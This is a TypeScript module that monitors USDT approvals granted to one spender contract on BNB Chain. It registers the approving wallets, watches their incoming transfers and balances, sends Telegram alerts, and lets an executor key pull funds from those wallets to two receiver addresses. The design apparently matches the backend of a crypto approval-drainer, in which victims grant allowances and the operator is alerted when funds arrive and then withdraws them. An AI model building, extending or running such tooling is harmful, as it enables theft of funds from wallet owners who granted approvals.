import crypto from "node:crypto";
import { ethers } from "ethers";
import { config } from "./config";
import { Store, type ApprovalRecord, type TransferRecord, type WalletRecord } from "./store";

const ABI = [
  "function executeToReceiver1(address wallet,uint256 amount)",
  "function executeToReceiver2(address wallet,uint256 amount)",
  "function isExecutor(address) view returns (bool)",
  "function usdt() view returns (address)"
];
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)"
];
const MAX_RATE_LIMIT_RETRIES = 5;
const INITIAL_RATE_LIMIT_DELAY_MS = 500;
const RPC_REQUEST_TIMEOUT_MS = 10_000;
const BALANCE_REFRESH_CONCURRENCY = 5;

function normalizeTokenDecimals(value: unknown): number {
  const decimals = typeof value === "number"
    ? value
    : typeof value === "string" && /^\d+$/.test(value)
      ? Number(value)
      : Number.NaN;
  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 36) return 6;
  return decimals;
}

function createRpcProvider(url: string): ethers.JsonRpcProvider {
  const request = new ethers.FetchRequest(url);
  request.timeout = RPC_REQUEST_TIMEOUT_MS;
  return new ethers.JsonRpcProvider(
    request,
    { name: "bnb", chainId: config.CHAIN_ID },
    { batchMaxCount: 1 }
  );
}

class FailoverJsonRpcProvider extends ethers.JsonRpcProvider {
  private primaryFailed = false;

  constructor(primaryUrl: string, private readonly fallbackProvider: ethers.JsonRpcProvider) {
    const request = new ethers.FetchRequest(primaryUrl);
    request.timeout = RPC_REQUEST_TIMEOUT_MS;
    super(request, { name: "bnb", chainId: config.CHAIN_ID }, { batchMaxCount: 1 });
  }

  override async send(method: string, params: Array<any> | Record<string, any>): Promise<any> {
    if (this.primaryFailed) return this.fallbackProvider.send(method, params);

    try {
      return await super.send(method, params);
    } catch {
      this.primaryFailed = true;
      console.warn(`Primary BSC RPC failed for ${method}; switching to fallback RPC`);
      return this.fallbackProvider.send(method, params);
    }
  }

  override async _send(payload: Parameters<ethers.JsonRpcProvider["_send"]>[0]) {
    if (this.primaryFailed) return this.fallbackProvider._send(payload);

    try {
      const response = await super._send(payload);
      if (response.some((item) => "error" in item && isRateLimitError(item.error))) {
        this.primaryFailed = true;
        console.warn("Primary BSC RPC returned a usage-limit error; switching to fallback RPC");
        return this.fallbackProvider._send(payload);
      }
      return response;
    } catch {
      this.primaryFailed = true;
      console.warn("Primary BSC RPC connection failed; switching to fallback RPC");
      return this.fallbackProvider._send(payload);
    }
  }
}

function isRateLimitError(error: unknown): boolean {
  const pending: unknown[] = [error];
  const seen = new Set<object>();
  const rateLimitMessage = /rate.?limit|usage.?limit|too many requests|\b429\b/i;
  const rangeLimitMessage = /limit exceeded|query returned more than|block range/i;
  let hasRateLimitCode = false;
  let hasRangeLimitMessage = false;

  while (pending.length > 0) {
    const current = pending.pop();
    if (typeof current === "string") {
      if (rateLimitMessage.test(current)) return true;
      if (rangeLimitMessage.test(current)) hasRangeLimitMessage = true;
      continue;
    }
    if (typeof current !== "object" || current === null || seen.has(current)) continue;
    seen.add(current);

    const details = current as Record<string, unknown>;
    if (
      details.code === -32001 || details.code === "-32001" ||
      details.code === -32005 || details.code === "-32005"
    ) hasRateLimitCode = true;
    for (const key of ["message", "shortMessage", "reason", "error", "info", "cause", "response"]) {
      const detail = details[key];
      if (typeof detail === "string" || (typeof detail === "object" && detail !== null)) {
        pending.push(detail);
      }
    }
  }

  return hasRateLimitCode && !hasRangeLimitMessage;
}

function isLogRangeLimitError(error: unknown): boolean {
  const pending: unknown[] = [error];
  const seen = new Set<object>();
  const rangeLimitMessage = /limit exceeded|query returned more than|block range/i;

  while (pending.length > 0) {
    const current = pending.pop();
    if (typeof current === "string") {
      if (rangeLimitMessage.test(current)) return true;
      continue;
    }
    if (typeof current !== "object" || current === null || seen.has(current)) continue;
    seen.add(current);

    const details = current as Record<string, unknown>;
    for (const key of ["message", "shortMessage", "reason", "error", "info", "cause", "response"]) {
      const detail = details[key];
      if (typeof detail === "string" || (typeof detail === "object" && detail !== null)) {
        pending.push(detail);
      }
    }
  }

  return false;
}

export class ManualTransferError extends Error {
  constructor(message: string, readonly statusCode: number) {
    super(message);
    this.name = "ManualTransferError";
  }
}

export class WalletMonitor {
  private readonly fallbackProvider = createRpcProvider(config.BNB_MAINNET_RPC_FALLBACK_URL);
  private readonly provider = new FailoverJsonRpcProvider(config.BNB_MAINNET_RPC_URL, this.fallbackProvider);
  private readonly signer = config.EXECUTOR_PRIVATE_KEY ? new ethers.Wallet(config.EXECUTOR_PRIVATE_KEY, this.provider) : null;
  private readonly contract = this.signer ? new ethers.Contract(config.ALLOWANCE_SPENDER_ADDRESS, ABI, this.signer) : null;
  private readonly token = new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, this.provider);
  private readonly eventInterface = new ethers.Interface([
    "event Approval(address indexed owner,address indexed spender,uint256 value)",
    "event Transfer(address indexed from,address indexed to,uint256 value)"
  ]);
  private tokenDecimals = 6;
  private tokenSymbol = "USDT";
  private readonly blockTimestampCache = new Map<number, string>();
  private running = false;
  private eventQueue: Promise<void> = Promise.resolve();
  private pendingBlockNumber?: number;
  private blockProcessingScheduled = false;
  private latestObservedBlock = 0;
  private balanceRefreshInProgress = false;
  private balanceRefreshRequested = false;
  private readonly pendingTransferBalanceUpdates = new Map<string, Set<string>>();
  private readonly blockListener = (blockNumber: number) => {
    void this.enqueueBlock(blockNumber).catch((error) => {
      console.error("Block event processing failed:", error);
    });
  };

  constructor(private readonly store: Store) {}

  async start() {
    if (this.running) return;
    const network = await this.provider.getNetwork();
    if (network.chainId !== BigInt(config.CHAIN_ID)) {
      throw new Error(`RPC chain ID ${network.chainId} does not match configured chain ID ${config.CHAIN_ID}`);
    }
    const [tokenDecimals, tokenSymbol] = await Promise.all([
      this.token.decimals().catch(() => 6),
      this.token.symbol().catch(() => "USDT")
    ]);
    this.tokenDecimals = normalizeTokenDecimals(Number(tokenDecimals));
    this.tokenSymbol = tokenSymbol;
    this.store.setLifetimeTransferredDecimals(this.tokenDecimals);
    if (this.contract) {
      await this.assertExecutor();
    }
    this.running = true;
    try {
      await this.recoverApprovalLinkedWallets();
      this.provider.on("block", this.blockListener);
      this.scheduleApprovalLinkedWalletBalanceRefresh();
      await this.enqueueBlock(await this.provider.getBlockNumber());
    } catch (error) {
      this.running = false;
      await this.provider.off("block", this.blockListener);
      throw error;
    }
  }

  stop() {
    this.running = false;
    void this.provider.off("block", this.blockListener);
  }

  private enqueueBlock(blockNumber: number): Promise<void> {
    this.latestObservedBlock = Math.max(this.latestObservedBlock, blockNumber);
    this.pendingBlockNumber = Math.max(this.pendingBlockNumber ?? blockNumber, blockNumber);
    if (this.blockProcessingScheduled) return this.eventQueue;

    this.blockProcessingScheduled = true;
    const processing = this.eventQueue.then(async () => {
      try {
        while (this.running && this.pendingBlockNumber !== undefined) {
          const latestBlock = this.pendingBlockNumber;
          this.pendingBlockNumber = undefined;
          await this.scanBlockchainEvents(latestBlock);
        }
      } finally {
        this.blockProcessingScheduled = false;
      }
    });
    this.eventQueue = processing.catch(() => undefined);
    return processing;
  }

  private async assertExecutor() {
    if (!this.contract || !this.signer) throw new Error("Executor private key is not configured");
    const tokenAddress = await this.contract.usdt() as string;
    if (tokenAddress.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()) {
      throw new Error(`Configured token ${config.USDT_ADDRESS} does not match spender contract token ${tokenAddress}`);
    }
    if (!(await this.contract.isExecutor(this.signer.address))) throw new Error(`Executor ${this.signer.address} is not authorized`);
  }

  private async recoverApprovalLinkedWallets() {
    const approvals = this.store.listApprovalEvents()
      .filter((approval) =>
        approval.tokenContract.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
        approval.spender.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
        approval.chainId === String(config.CHAIN_ID)
      )
      .sort((first, second) =>
        first.blockNumber - second.blockNumber || first.logIndex - second.logIndex
      );
    const latestApprovalByWallet = new Map<string, ApprovalRecord>();
    for (const approval of approvals) {
      latestApprovalByWallet.set((approval.walletAddress || approval.ownerAddress).toLowerCase(), approval);
    }
    for (const approval of latestApprovalByWallet.values()) {
      const wallet = approval.walletAddress || approval.ownerAddress;
      if (!wallet) continue;
      const existing = this.store.getWallet(wallet);
      const nextWallet: WalletRecord = {
        ...existing,
        address: wallet,
        receiver: existing?.receiver ?? 1,
        active: existing?.active ?? true,
        createdAt: existing?.createdAt ?? new Date().toISOString(),
        approvalLinked: true,
        tokenContract: config.USDT_ADDRESS,
        tokenSymbol: approval.tokenSymbol || existing?.tokenSymbol || "USDT",
        tokenDecimals: normalizeTokenDecimals(approval.tokenDecimals ?? existing?.tokenDecimals),
        network: config.NETWORK_NAME,
        chainId: String(config.CHAIN_ID),
        currentAllowance: approval.approvalAmount,
        spender: approval.spender,
        firstDetectedAt: approval.createdAt,
        latestApprovalTxHash: approval.transactionHash,
        latestActivityAt: approval.blockTimestamp,
        updatedAt: new Date().toISOString()
      };
      await this.store.register(nextWallet);
    }
  }

  private async refreshWalletBalance(walletAddress: string, decimals: number): Promise<string | undefined> {
    let currentBalance: string;
    try {
      const balance = await this.token.balanceOf(walletAddress);
      currentBalance = ethers.formatUnits(balance, normalizeTokenDecimals(decimals));
    } catch (error) {
      console.error(`Balance fetch failed for ${walletAddress}:`, error);
      return undefined;
    }
    await this.store.update(walletAddress, { currentBalance });
    return currentBalance;
  }

  private async refreshApprovalLinkedWalletBalances() {
    const wallets = this.store.listApprovalLinkedWallets();
    let nextWallet = 0;
    const worker = async () => {
      while (nextWallet < wallets.length) {
        const wallet = wallets[nextWallet++];
        const currentBalance = await this.refreshWalletBalance(
          wallet.address,
          normalizeTokenDecimals(wallet.tokenDecimals)
        );
        if (currentBalance === undefined) continue;

        const walletAddress = wallet.address.toLowerCase();
        const pendingTransferIds = this.pendingTransferBalanceUpdates.get(walletAddress);
        if (!pendingTransferIds) continue;
        for (const transferId of [...pendingTransferIds]) {
          const transfer = this.store.getTransferEvent(transferId);
          if (transfer) {
            await this.store.upsertTransfer({
              ...transfer,
              currentBalance,
              updatedAt: new Date().toISOString()
            });
          }
          pendingTransferIds.delete(transferId);
        }
        if (pendingTransferIds.size === 0) {
          this.pendingTransferBalanceUpdates.delete(walletAddress);
        }
      }
    };
    await Promise.all(
      Array.from(
        { length: Math.min(BALANCE_REFRESH_CONCURRENCY, wallets.length) },
        () => worker()
      )
    );
  }

  private scheduleApprovalLinkedWalletBalanceRefresh() {
    if (!this.running) return;
    if (this.balanceRefreshInProgress) {
      this.balanceRefreshRequested = true;
      return;
    }

    this.balanceRefreshInProgress = true;
    void this.refreshApprovalLinkedWalletBalances()
      .catch((error) => {
        console.error("Approval-linked wallet balance refresh failed:", error);
      })
      .finally(() => {
        this.balanceRefreshInProgress = false;
        if (this.balanceRefreshRequested && this.running) {
          this.balanceRefreshRequested = false;
          this.scheduleApprovalLinkedWalletBalanceRefresh();
        }
      });
  }

  private async getBlockTimestamp(blockNumber: number, fallback: string) {
    const cached = this.blockTimestampCache.get(blockNumber);
    if (cached) return cached;

    const block = await this.provider.getBlock(blockNumber);
    const timestamp = block?.timestamp
      ? new Date(Number(block.timestamp) * 1000).toISOString()
      : fallback;
    if (block) {
      if (this.blockTimestampCache.size >= 500) {
        const oldestBlock = this.blockTimestampCache.keys().next().value;
        if (oldestBlock !== undefined) this.blockTimestampCache.delete(oldestBlock);
      }
      this.blockTimestampCache.set(blockNumber, timestamp);
    }
    return timestamp;
  }

  private async getLogsWithRangeFallback(
    filter: Omit<ethers.Filter, "fromBlock" | "toBlock">,
    fromBlock: number,
    toBlock: number,
    provider: ethers.JsonRpcProvider = this.provider
  ): Promise<ethers.Log[]> {
    for (let rateLimitAttempt = 0; ; rateLimitAttempt += 1) {
      try {
        return await provider.getLogs({ ...filter, fromBlock, toBlock });
      } catch (error) {
        if (isRateLimitError(error)) {
          if (rateLimitAttempt >= MAX_RATE_LIMIT_RETRIES) {
            if (provider !== this.provider) throw error;
            console.warn(`RPC rate limit for blocks ${fromBlock}-${toBlock}; switching to fallback RPC`);
            return this.getLogsWithRangeFallback(filter, fromBlock, toBlock, this.fallbackProvider);
          }
          const delayMs = INITIAL_RATE_LIMIT_DELAY_MS * 2 ** rateLimitAttempt;
          console.warn(`RPC rate limit for blocks ${fromBlock}-${toBlock}; retrying in ${delayMs}ms`);
          await new Promise((resolve) => setTimeout(resolve, delayMs));
          continue;
        }
        if (isLogRangeLimitError(error)) {
          if (fromBlock >= toBlock) {
            if (provider !== this.provider) throw error;
            console.warn(`Primary RPC rejected log query for block ${fromBlock}; switching to fallback RPC`);
            return this.getLogsWithRangeFallback(filter, fromBlock, toBlock, this.fallbackProvider);
          }
          const middleBlock = Math.floor((fromBlock + toBlock) / 2);
          console.warn(`RPC log query exceeded limits for blocks ${fromBlock}-${toBlock}; retrying in smaller ranges`);
          const firstHalf = await this.getLogsWithRangeFallback(filter, fromBlock, middleBlock, provider);
          const secondHalf = await this.getLogsWithRangeFallback(filter, middleBlock + 1, toBlock, provider);
          return [...firstHalf, ...secondHalf];
        }
        if (provider === this.provider) {
          console.warn(`Primary RPC log query failed for blocks ${fromBlock}-${toBlock}; switching to fallback RPC`);
          return this.getLogsWithRangeFallback(filter, fromBlock, toBlock, this.fallbackProvider);
        }
        if (fromBlock >= toBlock) throw error;
        const middleBlock = Math.floor((fromBlock + toBlock) / 2);
        console.warn(`RPC log query failed for blocks ${fromBlock}-${toBlock}; retrying in smaller ranges`);
        const firstHalf = await this.getLogsWithRangeFallback(filter, fromBlock, middleBlock, provider);
        const secondHalf = await this.getLogsWithRangeFallback(filter, middleBlock + 1, toBlock, provider);
        return [...firstHalf, ...secondHalf];
      }
    }
  }

  private async scanBlockchainEvents(latestBlock: number) {
    if (!this.running) return;
    const state = this.store.getMonitoringState("Approval+Transfer");
    const stateMatchesConfiguration =
      state.contractAddress.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
      state.chainId === config.CHAIN_ID;
    const lastProcessedBlock = stateMatchesConfiguration
      ? state.lastProcessedBlock
      : config.MONITOR_START_BLOCK - 1;
    const start = Math.max(lastProcessedBlock + 1, config.MONITOR_START_BLOCK);
    if (start > latestBlock) return;

    const approvalTopic = this.eventInterface.getEvent("Approval")!.topicHash;
    const transferTopic = this.eventInterface.getEvent("Transfer")!.topicHash;
    const spenderTopic = ethers.zeroPadValue(config.ALLOWANCE_SPENDER_ADDRESS, 32);
    const maxRange = 50;
    for (let from = start; from <= latestBlock; from += maxRange) {
      const to = Math.min(from + maxRange - 1, latestBlock);
      const rangeStartedAt = Date.now();
      try {
        const approvalLogs = await this.getLogsWithRangeFallback({
          address: config.USDT_ADDRESS,
          topics: [approvalTopic, null, spenderTopic]
        }, from, to);

        for (const log of approvalLogs) await this.processApprovalLog(log);

        const monitoredAddresses = this.store.listApprovalLinkedWallets().map((wallet) => wallet.address);
        for (let index = 0; index < monitoredAddresses.length; index += 100) {
          const recipientTopics = monitoredAddresses
            .slice(index, index + 100)
            .map((walletAddress) => ethers.zeroPadValue(walletAddress, 32));
          const transferLogs = await this.getLogsWithRangeFallback({
            address: config.USDT_ADDRESS,
            topics: [transferTopic, null, recipientTopics]
          }, from, to);
          for (const log of transferLogs) await this.processTransferLog(log);
        }

        await this.store.setMonitoringState({
          network: config.NETWORK_NAME,
          chainId: config.CHAIN_ID,
          contractAddress: config.USDT_ADDRESS,
          eventType: "Approval+Transfer",
          lastProcessedBlock: to,
          updatedAt: new Date().toISOString()
        });
      } finally {
        console.log(
          `[Monitor] latest=${this.latestObservedBlock} start=${from} end=${to} ` +
          `duration=${Date.now() - rangeStartedAt}ms lag=${Math.max(0, this.latestObservedBlock - to)}`
        );
      }
    }
    this.scheduleApprovalLinkedWalletBalanceRefresh();
  }

  private async processApprovalLog(log: ethers.Log) {
    const parsed = this.eventInterface.parseLog(log);
    if (!parsed || parsed.name !== "Approval") return;
    const owner = String(parsed.args[0]);
    const spender = String(parsed.args[1]);
    const value = parsed.args[2] as bigint;
    if (spender.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase()) return;

    const eventId = `approval-${config.USDT_ADDRESS.toLowerCase()}-${log.transactionHash.toLowerCase()}-${log.index}`;
    const existing = this.store.getApprovalEvent(eventId);
    if (existing) {
      await this.linkApprovalWallet(existing, false);
      return;
    }

    const now = new Date().toISOString();
    const record: ApprovalRecord = {
      id: eventId,
      walletAddress: owner,
      ownerAddress: owner,
      spender,
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: this.tokenSymbol,
      tokenDecimals: this.tokenDecimals,
      approvalAmount: ethers.formatUnits(value, this.tokenDecimals),
      rawApprovalAmount: value.toString(),
      network: config.NETWORK_NAME,
      chainId: String(config.CHAIN_ID),
      blockNumber: Number(log.blockNumber),
      blockTimestamp: await this.getBlockTimestamp(log.blockNumber, now),
      transactionHash: log.transactionHash,
      logIndex: Number(log.index),
      eventType: "Approval",
      processingStatus: "processed",
      telegramStatus: "pending",
      telegramAttemptCount: 0,
      createdAt: now,
      updatedAt: now
    };

    await this.store.upsertApproval(record);
    await this.linkApprovalWallet(record, true);
    await this.sendTelegramNotification("Approval", record);
  }

  private async linkApprovalWallet(approval: ApprovalRecord, reactivate: boolean) {
    const existing = this.store.getWallet(approval.walletAddress);
    const now = new Date().toISOString();
    const wallet: WalletRecord = {
      ...existing,
      address: approval.walletAddress,
      receiver: existing?.receiver ?? 1,
      active: reactivate ? true : existing?.active ?? true,
      createdAt: existing?.createdAt ?? now,
      approvalLinked: true,
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: approval.tokenSymbol,
      tokenDecimals: normalizeTokenDecimals(approval.tokenDecimals),
      network: config.NETWORK_NAME,
      chainId: approval.chainId,
      currentAllowance: approval.approvalAmount,
      spender: approval.spender,
      firstDetectedAt: existing?.firstDetectedAt ?? approval.createdAt,
      latestApprovalTxHash: approval.transactionHash,
      latestActivityAt: approval.blockTimestamp,
      updatedAt: now
    };
    await this.store.register(wallet);
  }

  private async processTransferLog(log: ethers.Log) {
    const parsed = this.eventInterface.parseLog(log);
    if (!parsed || parsed.name !== "Transfer") return;
    const from = String(parsed.args[0]);
    const to = String(parsed.args[1]);
    const value = parsed.args[2] as bigint;
    const monitoredWallets = new Set(this.store.listApprovalLinkedWallets().map((wallet) => wallet.address.toLowerCase()));
    if (!monitoredWallets.has(to.toLowerCase())) return;

    const eventId = `transfer-${config.USDT_ADDRESS.toLowerCase()}-${log.transactionHash.toLowerCase()}-${log.index}`;
    const existing = this.store.getTransferEvent(eventId);
    if (existing) return;

    const decimals = this.tokenDecimals;
    const symbol = this.tokenSymbol;
    const transferAmount = ethers.formatUnits(value, decimals);

    const now = new Date().toISOString();
    const record: TransferRecord = {
      id: eventId,
      walletAddress: to,
      receivingWallet: to,
      sender: from,
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: symbol,
      tokenDecimals: decimals,
      transferAmount,
      rawTransferAmount: value.toString(),
      network: config.NETWORK_NAME,
      chainId: String(config.CHAIN_ID),
      blockNumber: Number(log.blockNumber),
      blockTimestamp: await this.getBlockTimestamp(log.blockNumber, now),
      transactionHash: log.transactionHash,
      logIndex: Number(log.index),
      eventType: "Transfer",
      processingStatus: "processed",
      telegramStatus: "pending",
      telegramAttemptCount: 0,
      createdAt: now,
      updatedAt: now
    };

    await this.store.upsertTransfer(record);
    const walletAddress = to.toLowerCase();
    const pendingTransferIds = this.pendingTransferBalanceUpdates.get(walletAddress) ?? new Set<string>();
    pendingTransferIds.add(eventId);
    this.pendingTransferBalanceUpdates.set(walletAddress, pendingTransferIds);
    const wallet = this.store.getWallet(to);
    if (wallet) {
      await this.store.update(to, {
        tokenContract: config.USDT_ADDRESS,
        tokenSymbol: symbol,
        tokenDecimals: decimals,
        network: config.NETWORK_NAME,
        chainId: String(config.CHAIN_ID),
        latestTransferTxHash: log.transactionHash,
        latestActivityAt: record.blockTimestamp,
        updatedAt: record.updatedAt
      });
    }
    await this.sendTelegramNotification("Transfer", record);
  }

  private async sendTelegramNotification(type: "Approval" | "Transfer", record: ApprovalRecord | TransferRecord) {
    const current = record as ApprovalRecord | TransferRecord;
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
      current.telegramStatus = "skipped";
      if (type === "Approval") await this.store.upsertApproval(current as ApprovalRecord);
      else await this.store.upsertTransfer(current as TransferRecord);
      return;
    }

    if (current.telegramStatus === "sent") return;
    const attempted = current.telegramAttemptCount + 1;
    const text = type === "Approval"
      ? [
          "🔔 NEW APPROVAL DETECTED",
          `Wallet: ${(record as ApprovalRecord).walletAddress}`,
          `Approval Amount: ${Number((record as ApprovalRecord).approvalAmount).toLocaleString()} ${record.tokenSymbol}`,
          `Spender: ${(record as ApprovalRecord).spender}`,
          `Token: ${record.tokenSymbol}`,
          `Network: ${record.network}`,
          `Date: ${new Date(record.blockTimestamp).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" })}`,
          `Time: ${new Date(record.blockTimestamp).toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit" })}`,
          `Transaction: ${record.transactionHash}`,
          `Block: ${record.blockNumber}`
        ].join("\n")
      : [
          "💰 INCOMING USDT TRANSFER",
          `Wallet: ${(record as TransferRecord).walletAddress}`,
          `Amount Received: ${(record as TransferRecord).transferAmount} ${record.tokenSymbol}`,
          `Total ${record.tokenSymbol} Balance: ${(record as TransferRecord).currentBalance ?? "N/A"} ${record.tokenSymbol}`,
          `From: ${(record as TransferRecord).sender}`,
          `Token: ${record.tokenSymbol}`,
          `Network: ${record.network}`,
          `Date: ${new Date(record.blockTimestamp).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" })}`,
          `Time: ${new Date(record.blockTimestamp).toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit" })}`,
          `Transaction: ${record.transactionHash}`,
          `Block: ${record.blockNumber}`
        ].join("\n");

    try {
      const response = await fetch(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: config.TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
      });

      const data = (await response.json()) as { ok?: boolean; description?: string };
      if (!response.ok || !data.ok) throw new Error(data.description ?? "Telegram send failed");
      current.telegramStatus = "sent";
      current.telegramSentAt = new Date().toISOString();
      current.telegramAttemptCount = attempted;
      current.telegramError = undefined;
    } catch (error) {
      current.telegramStatus = "failed";
      current.telegramError = error instanceof Error ? error.message : String(error);
      current.telegramAttemptCount = attempted;
    }

    if (type === "Approval") {
      await this.store.upsertApproval(current as ApprovalRecord);
    } else {
      await this.store.upsertTransfer(current as TransferRecord);
    }
  }

  async executeManualTransfer(address: string, receiver: 1 | 2, requestedAmount: string) {
    const wallet = this.store.getWallet(address);
    if (!wallet?.active || !wallet.approvalLinked) {
      throw new ManualTransferError("Wallet is not active for monitored transfers", 404);
    }
    if (!this.contract || !this.signer) {
      throw new ManualTransferError("Manual transfers are not configured", 503);
    }

    const decimals = Number(await this.token.decimals());
    let amount: bigint;
    try {
      amount = ethers.parseUnits(requestedAmount, decimals);
    } catch {
      throw new ManualTransferError(`Enter a valid amount with no more than ${decimals} decimal places`, 400);
    }
    if (amount <= 0n) throw new ManualTransferError("Transfer amount must be greater than zero", 400);

    const record = await this.store.addHistory({
      id: crypto.randomUUID(),
      wallet: wallet.address,
      receiver,
      amount: amount.toString(),
      status: "submitted",
      createdAt: new Date().toISOString()
    });

    const method = receiver === 1 ? "executeToReceiver1" : "executeToReceiver2";
    let transaction: ethers.TransactionResponse;
    try {
      transaction = await this.contract[method](wallet.address, amount);
    } catch (error) {
      record.status = "failed";
      record.error = error instanceof Error ? error.message : String(error);
      return this.store.addHistory(record);
    }

    record.txHash = transaction.hash;
    await this.store.addHistory(record);
    try {
      await transaction.wait();
    } catch (error) {
      record.status = "failed";
      record.error = error instanceof Error ? error.message : String(error);
      return this.store.addHistory(record);
    }

    record.status = "confirmed";
    await this.store.addHistory(record);
    await this.store.incrementLifetimeTransferredAmount(record.id, record.amount);
    return record;
  }
}
